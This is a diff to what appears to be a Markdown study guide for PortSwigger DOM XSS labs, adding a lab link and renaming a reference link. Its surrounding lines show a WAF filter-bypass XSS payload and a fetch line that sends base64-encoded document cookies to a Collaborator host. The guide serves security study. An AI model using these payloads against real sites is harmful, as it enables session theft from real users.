@@ -200,6 +200,8 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 ![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
+[PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
+
 >WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  
 
 ```JavaScript
@@ -208,7 +210,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 "-self["alert"](self["document"]["cookie"])-"
 ```  
 
-[Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
+[secjuice: Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
   
 ```JavaScript
 fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
